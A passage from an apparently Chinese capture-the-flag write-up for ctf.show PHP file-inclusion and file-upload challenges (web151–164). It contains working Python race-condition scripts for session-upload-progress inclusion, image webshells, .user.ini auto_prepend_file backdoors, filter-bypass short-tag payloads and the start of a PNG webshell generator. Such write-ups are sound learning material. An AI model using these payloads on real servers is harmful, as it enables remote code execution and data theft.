class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $vip;</span><br><span class="line">    <span class="keyword">private</span> $secret;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ËøáÊª§Â≠óÁ¨¶</span></span><br><span class="line">$key = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, $key))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($isVIP &amp;&amp; strrpos($ctf, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; strrpos($ctf,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âú®‰∏ä‰∏ÄÈ¢òÁöÑÂü∫Á°Ä‰∏äban‰∫ÜlogÂ≠óÁ¨¶ÔºåÊâÄ‰ª•‰∏çËÉΩ‰ΩøÁî®Êó•ÂøóÂåÖÂê´Ôºå‰ΩÜÂèëÁé∞ÂèØ‰ª•‰ΩøÁî®sessionËøõË°åÊñá‰ª∂ÂåÖÂê´ÔºåÁü•ËØÜÁÇπÂøòËÆ∞ÁöÑÂèØ‰ª•ÁúãÂâçÈù¢ÂÜôÁöÑweb82<br>web82ÂÜôÁöÑËÑöÊú¨ÊîπÊîπÁõ¥Êé•Áî®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/7 14:57</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://7eda1482-7964-4319-96d3-1689b4a62307.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&#x27;/tmp/sess_flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?isVIP=1&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂç≥ÂèØÂæóÂà∞flag</p><h2 id="Êñá‰ª∂‰∏ä‰º†-151-170"><a class="header-anchor" href="#Êñá‰ª∂‰∏ä‰º†-151-170">¬∂</a>Êñá‰ª∂‰∏ä‰º†(151-170)</h2><h3 id="web151"><a class="header-anchor" href="#web151">¬∂</a>web151</h3><p>‰∏ä‰º†ÂõæÁâáÈ©¨ÔºåÁÑ∂ÂêéÂú®burpsuieÈáåÊääÂêéÁºÄpngÊõ¥Êîπ‰∏∫phpÔºåÂÜçÂéªÊâßË°åÂëΩ‰ª§Âç≥ÂèØÔºåÂà∂‰ΩúÂõæÁâáÈ©¨ÊñπÊ≥ï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Áî®‰∏ÄÂº†Â∞èÁÇπÁöÑÂõæÁâáÂíå‰∏ÄÂè•ËØùÊú®È©¨ÔºåÂà©Áî®copyÂëΩ‰ª§ÁîüÊàêÂõæÁâáÈ©¨</span><br><span class="line">copy 1.png&#x2F;b+2.php&#x2F;a 3.png</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151/0YSHJ%7B%40I0T6KYXO29D_Q28L.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151/WWO85%7DNV%5BN~X%5B%29JU%7BG4VO5N.png" alt=""></p><h3 id="web152"><a class="header-anchor" href="#web152">¬∂</a>web152</h3><p>Âíå‰∏äÈ¢ò‰∏ÄÊ†∑ÁöÑÊñπÊ≥ï</p><h3 id="web153"><a class="header-anchor" href="#web153">¬∂</a>web153</h3><p>ÂºÄÂßãÂØπphpÂêéÁºÄËøõË°å‰∫ÜÈôêÂà∂ÔºåËøôÈáåÊàë‰ª¨Âà©Áî®<code>.user.ini</code>Êù•ÊûÑÈÄ†ÂêéÈó®</p><blockquote><p>php.iniÊòØphpÁöÑ‰∏Ä‰∏™ÂÖ®Â±ÄÈÖçÁΩÆÊñá‰ª∂ÔºåÂØπÊï¥‰∏™webÊúçÂä°Ëµ∑‰ΩúÁî®ÔºõËÄå.user.iniÂíå.htaccess‰∏ÄÊ†∑ÊòØÁõÆÂΩïÁöÑÈÖçÁΩÆÊñá‰ª∂Ôºå.user.iniÂ∞±ÊòØÁî®Êà∑Ëá™ÂÆö‰πâÁöÑ‰∏Ä‰∏™php.iniÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏™Êñá‰ª∂Êù•ÊûÑÈÄ†ÂêéÈó®ÂíåÈöêËóèÂêéÈó®„ÄÇ</p></blockquote><p>ËøôÈáåËØ¥‰∏Ä‰∏ãphp‰∏≠ÁöÑ‰∏§‰∏™ÈÖçÁΩÆÈ°π</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;filename      &#x2F;&#x2F;ÂåÖÂê´Âú®Êñá‰ª∂Â§¥</span><br><span class="line">auto_append_file&#x3D;filename       &#x2F;&#x2F;ÂåÖÂê´Âú®Êñá‰ª∂Â∞æ</span><br></pre></td></tr></table></figure><p>‰∏æ‰∏™‰æãÂ≠ê</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.user.ini</span><br><span class="line">auto_prepend_file&#x3D;1.png</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.png</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.php(‰ªªÊÑèphpÊñá‰ª∂)</span><br></pre></td></tr></table></figure><p>Êª°Ë∂≥Ëøô‰∏â‰∏™Êñá‰ª∂Âú®Âêå‰∏ÄÁõÆÂΩï‰∏ãÔºåÂàôÁõ∏ÂΩì‰∫éÂú®1.phpÊñá‰ª∂ÈáåÊèíÂÖ•‰∫ÜÂåÖÂê´ËØ≠Âè•<code>require('1.png')</code>ÔºåËøõË°å‰∫ÜÊñá‰ª∂ÂåÖÂê´ÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±‰æùÊ¨°‰∏ä‰º†Âç≥ÂèØ</p><p>È¶ñÂÖà‰∏ä‰º†<code>.user.ini</code>Êñá‰ª∂<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/MTSOG%5B4H0OV0%28U52%7B%7DDQW11.png" alt=""><br>Êé•ÁùÄ‰∏ä‰º†‰∏Ä‰∏™ÂõæÁâáÈ©¨<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/6BXA%29G%60IR%5B2%29T35_~6%60%5B%40A9.png" alt=""><br>ÁÑ∂ÂêéËÆøÈóÆuploadÁõÆÂΩïÔºåÂç≥<code>ÂÅöÈ¢òÂú∞ÂùÄ+/upload</code>Âç≥ÂèØÔºåÂõ†‰∏∫Ê≠§ÁõÆÂΩï‰∏ãÂéüÊú¨Êúâ‰∏™index.phpÔºåÊé•ÁùÄÂÜçÊâßË°åÊàë‰ª¨ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨Ëé∑Âèñflag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/8K786RK91XNNQD0P%292%600X6K.png" alt=""></p><h3 id="web154"><a class="header-anchor" href="#web154">¬∂</a>web154</h3><p>ÁªßÁª≠ÊåâÁÖß‰∏äÈ¢òÊ≠•È™§Ôºå‰º†‰∏Ä‰∏™<code>.user.ini</code>Êñá‰ª∂ÔºåÊé•ÁùÄÂú®‰∏ä‰º†ÂõæÁâáÈ©¨ÁöÑÊó∂ÂÄôÊä•Èîô‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/%25QP8%60%25S%29ZYBOT%28S%60_%29T9E%295.png" alt=""><br>Ëß£Á†ÅÂêéÊòæÁ§∫ÁöÑÊñáÂ≠óÊòØ‰∏çÊîØÊåÅÊ†ºÂºèÔºåËØ¥ÊòéÂèØËÉΩÂÜÖÂÆπÈáåÁöÑphpË¢´ban‰∫ÜÔºåÊîπÊàêÁü≠Ê†áÁ≠æÁöÑÂΩ¢ÂºèÂÜç‰∏ä‰º†ÔºåÂèëÁé∞ÂèØ‰ª•ÈÄöËøá</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Áü≠Ê†áÁ≠æÂΩ¢ÂºèÔºö&lt;?&#x3D;system(&quot;tac ..&#x2F;f*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/49%24EVN%25EGTU2X%290X0%7B5%28F2D.png" alt=""><br>Êé•ÁùÄÂÜçËÆøÈóÆuploadÁõÆÂΩïÔºåÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/HI%7DZZ%2885N%5D8J%258S7%24Y08XDC.png" alt=""></p><h3 id="web155"><a class="header-anchor" href="#web155">¬∂</a>web155</h3><p>Áî®‰∏äÈ¢ò(web154)ÁöÑÂäûÊ≥ïÂèØ‰ª•ÈÄöËøá</p><h3 id="web156"><a class="header-anchor" href="#web156">¬∂</a>web156</h3><p>Áî®‰∏äÈ¢ò(web154)ÁöÑÂäûÊ≥ïÂèØ‰ª•ÈÄöËøá</p><h3 id="web157"><a class="header-anchor" href="#web157">¬∂</a>web157</h3><p>‰∏ÄÊ†∑Áî®‰∏äÈ¢ò(web154)ÁöÑÂäûÊ≥ïÂèØ‰ª•ÈÄöËøáÔºå‰ΩÜËøáÊª§‰∫ÜÂàÜÂè∑ÔºåÊääÁü≠Ê†áÁ≠æÂêéÈù¢ÁöÑ<code>;</code>ÂéªÊéâÔºåÂç≥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Áü≠Ê†áÁ≠æÂΩ¢ÂºèÔºö&lt;?&#x3D;system(&quot;tac ..&#x2F;f*&quot;)?&gt;</span><br></pre></td></tr></table></figure><h3 id="web158"><a class="header-anchor" href="#web158">¬∂</a>web158</h3><p>Âíå‰∏äÈ¢ò‰∏ÄÊ†∑ÁöÑÂÅöÊ≥ï</p><h3 id="web159"><a class="header-anchor" href="#web159">¬∂</a>web159</h3><p>ËøôÈáåÊää()Áªôban‰∫ÜÔºåÊàë‰ª¨ÈááÁî®ÂèçÂºïÂè∑Êù•ÊâßË°åÂëΩ‰ª§ÔºåÂç≥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Áü≠Ê†áÁ≠æÂΩ¢ÂºèÔºö&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</span><br></pre></td></tr></table></figure><h3 id="web160"><a class="header-anchor" href="#web160">¬∂</a>web160</h3><p>‰æùÊóß‰∏ä‰º†‰∏™<code>.user.ini</code>Êñá‰ª∂Ôºå‰ΩÜÂú®‰º†ÂõæÁâáÈ©¨ÁöÑÊó∂ÂÄôÊääÂèçÂºïÂè∑Áªôban‰∫ÜÔºåÊàë‰ª¨‰ΩøÁî®includeÂëΩ‰ª§ÂéªÈÖçÂêàphp‰º™ÂçèËÆÆËøõË°åËØªÂèñÔºåÂõ†‰∏∫ÊääphpÁªôban‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÊãºÊé•Ëµ∑Êù•ÔºåÂç≥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;include&quot;ph&quot;.&quot;p:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;flag.p&quot;.&quot;hp&quot;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/0%404S4D%28_JME9O%60DP%25A%28UC6Y.png" alt=""><br>‰∏ä‰º†ÂêéËÆøÈóÆuploadÁõÆÂΩï<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/ND%25%5D_ZJ6%60%28F4%25XNI%5D2XAPLE.png" alt=""><br>Êé•ÁùÄÂÜçbase64Ëß£Á†ÅÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web161"><a class="header-anchor" href="#web161">¬∂</a>web161</h3><p>ËøôÊ¨°‰∏ä‰º†Â§±Ë¥•‰∫ÜÔºåÂ∞ùËØïÂú®Â§¥ÈÉ®Âä†‰∫ÜÂõæÁâáÊñá‰ª∂Â§¥ÔºåÂ∞±ËøáÂéª‰∫ÜÔºåÊâÄ‰ª•ËøôÈáåÂ∫îËØ•ÊòØÁî®‰∫Ügetimagesize()ËøõË°åÊ£ÄÊµã</p><blockquote><p><strong>getimagesize():</strong> ‰ºöÂØπÁõÆÊ†áÊñá‰ª∂ÁöÑ16ËøõÂà∂ÂéªËøõË°å‰∏Ä‰∏™ËØªÂèñÔºåÂéªËØªÂèñÂ§¥Âá†‰∏™Â≠óÁ¨¶‰∏≤ÊòØ‰∏çÊòØÁ¨¶ÂêàÂõæÁâáÁöÑË¶ÅÊ±Ç</p></blockquote><p>ÊâÄ‰ª•Âú®‰∏äÈ¢òÁöÑÂü∫Á°Ä‰∏äÈÉΩÂä†‰∏™GIF89aÂõæÁâáÂ§¥Â∞±ÂèØ‰ª•‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161/CQ%5D%7B%25E%40MBYWM%40RD~BGK0%28U4.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161/O8~YOH%5BXKF5%28MCGY406~%286H.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161/Q6%40AG%7BQ%25K1R%7D9%40Y1DP6BH4J.png" alt=""><br>Êé•ÁùÄËøõË°åbase64Ëß£Á†ÅÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web162"><a class="header-anchor" href="#web162">¬∂</a>web162</h3><p>ËøôÊ¨°Êää<code>.</code>Áªôban‰∫ÜÔºåÊàë‰ª¨‰ΩøÁî®sessionÊñá‰ª∂ÂåÖÂê´ÔºåÂèàÂøòËÆ∞Áü•ËØÜÁÇπÁöÑÂèØ‰ª•ÂéªÁúãweb82ÔºõËøòÊòØ‰∏ÄÊ†∑ÂÖà‰∏ä‰º†<code>.user.ini</code> ÔºåÂÜÖÂÆπ‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_muma</span><br></pre></td></tr></table></figure><p>Êé•ÁùÄÂÜçËøêË°åËÑöÊú¨Âç≥ÂèØ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/8 17:06</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;GIF89a\ndotast&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.png&#x27;</span>, f, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">        response = session.post(url+<span class="string">&quot;upload.php&quot;</span>,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;muma&#x27;</span>&#125;, data=data, files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure><p>ËøêË°åÂÆåÂêéÂæóÂà∞flag</p><h3 id="web163"><a class="header-anchor" href="#web163">¬∂</a>web163</h3><p>Âíå‰∏äÈ¢ò‰∏ÄÊ†∑ÈááÁî®sessionÊñá‰ª∂ÂåÖÂê´</p><h3 id="web164"><a class="header-anchor" href="#web164">¬∂</a>web164</h3><p>È¢òÁõÆËØ¥ÂºÄÂßãÊîπÂ§¥Êç¢Èù¢‰∫ÜÔºåÂÖàÂè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞Êúâ‰∏™download.php?image=<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/~_12SV4YLA4A7I10JF9WDTS.png" alt=""><br>ÁåúÊµãÊúâÂèØËÉΩÊòØ‰∏ä‰º†ÂõæÁâáÈ©¨ÔºåÁÑ∂ÂêéÊñá‰ª∂ÂåÖÂê´ÊâßË°åÂëΩ‰ª§ÔºåÊàë‰ª¨ÂÖà‰∏ä‰º†‰∏Ä‰∏™ÂõæÁâáÈ©¨<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/_TG%404%5D2VDJ~36D%60G%40S613XV.png" alt=""><br>ÁÇπÂáªÊü•ÁúãÂõæÁâáÔºåË∑≥ËΩ¨Âà∞ÂõæÁâáÈ°µÈù¢Ôºå‰ΩÜÂèëÁé∞ÊâßË°å‰∏ç‰∫ÜÔºåcrtl+sÊääÂõæÁâá‰∏ãËΩΩ‰∏ãÊù•ÂêéÔºåÂØπÊØî‰πãÂâçÁöÑÂõæÁâáÂèëÁé∞È©¨Ë¢´ÂºÑÊ≤°‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/R77H7B%24%2998%2489%40%5BC%259TNJ%7B1.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/L2KWH%7DKO0FXYTUEXS%5BUIXPU.png" alt=""><br>Â∫îËØ•ÊòØÁªèËøá‰∫Ü‰∫åÊ¨°Âà∑Êñ∞ÔºåËøôÈáåÁî®‰πãÂâçÊî∂ÈõÜÁöÑÂ§ñÂõΩÂ∏àÂÇÖÁöÑËÑöÊú¨Êù•ÁîüÊàêÂõæÁâáÈ©¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*&lt;?$_GET[0]($_POST[1]);?&gt;*/</span></span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span 